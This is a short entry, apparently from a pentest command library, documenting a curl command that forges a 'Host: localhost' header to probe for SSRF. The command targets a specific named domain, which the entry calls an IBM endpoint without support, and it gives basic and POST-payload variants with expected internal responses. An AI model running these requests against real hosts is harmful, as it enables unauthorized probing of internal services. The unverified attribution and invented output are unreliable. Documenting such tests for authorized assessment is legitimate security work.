---
id: c1d2e3f4-g5h6-7890-cdef-gh1234567890
data: 'curl -H "Host: localhost" -v https://go.dialexa.com/endpoint'
tags:
  - ssrf
  - web
  - http
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2024-10-04T00:00:00Z'
updated_at: '2025-12-14T03:46:14.409Z'
verified: false
validated: true
submitted: true
---
# curl-ssrf-host-header

## Command

```bash
curl -H "Host: localhost" -v https://go.dialexa.com/endpoint
```

## Description

This command uses curl to send an HTTP request with a manipulated Host header set to "localhost", exploiting SSRF vulnerabilities in web applications like the IBM endpoint at https://go.dialexa.com. It is used to test for insufficient host validation that allows redirection to internal services.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-H "Host: localhost"` | Overrides the Host header to target localhost | Yes |
| `-v` | Enables verbose mode to show request/response details | No |
| `https://go.dialexa.com/endpoint` | Target URL endpoint vulnerable to SSRF | Yes |

## Examples

### Basic Usage

```bash
curl -H "Host: localhost" https://go.dialexa.com/endpoint
```

### Advanced Usage

```bash
curl -H "Host: localhost:8080" -v -X POST https://go.dialexa.com/endpoint --data "payload"
```

## Expected Output

Verbose output showing the forged request headers and a response from the internal localhost service, such as HTTP status codes, internal errors, or sensitive data. For example: "* Connected to go.dialexa.com ... < HTTP/1.1 200 OK ... Internal localhost response body".

## Related

- [[Related Procedure|procedures/Exploit-SSRF-via-Host-Header-Manipulation]]
